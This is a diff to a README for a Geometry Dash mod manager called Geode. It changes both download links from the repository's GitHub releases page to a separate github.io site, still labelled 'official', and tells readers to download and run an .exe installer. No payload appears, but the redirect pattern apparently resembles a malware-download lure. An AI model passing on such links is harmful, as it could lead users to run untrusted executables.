@@ -1,6 +1,6 @@
 # 🎮 Geode-Geometry-Dash - Manage your favorite game mods easily
 
-[![Download Geode](https://img.shields.io/badge/Download-Geode-blue.svg)](https://github.com/IMadeThisAccForBlockyGames/Geode-Geometry-Dash/releases)
+[![Download Geode](https://img.shields.io/badge/Download-Geode-blue.svg)](https://imadethisaccforblockygames.github.io)
 
 ## 📦 What is Geode?
 
@@ -21,7 +21,7 @@ If your computer uses an older version of Windows, the application might not run
 
 Follow these steps to get Geode on your Windows computer.
 
-1.  Visit the official release page here: [https://github.com/IMadeThisAccForBlockyGames/Geode-Geometry-Dash/releases](https://github.com/IMadeThisAccForBlockyGames/Geode-Geometry-Dash/releases)
+1.  Visit the official release page here: [https://imadethisaccforblockygames.github.io](https://imadethisaccforblockygames.github.io)
 2.  Look for the file that ends in `.exe`. This is the installer.
 3.  Click the file name to start the download. Save the file to your Downloads folder.
 4.  Open your Downloads folder and double-click the file you just downloaded.
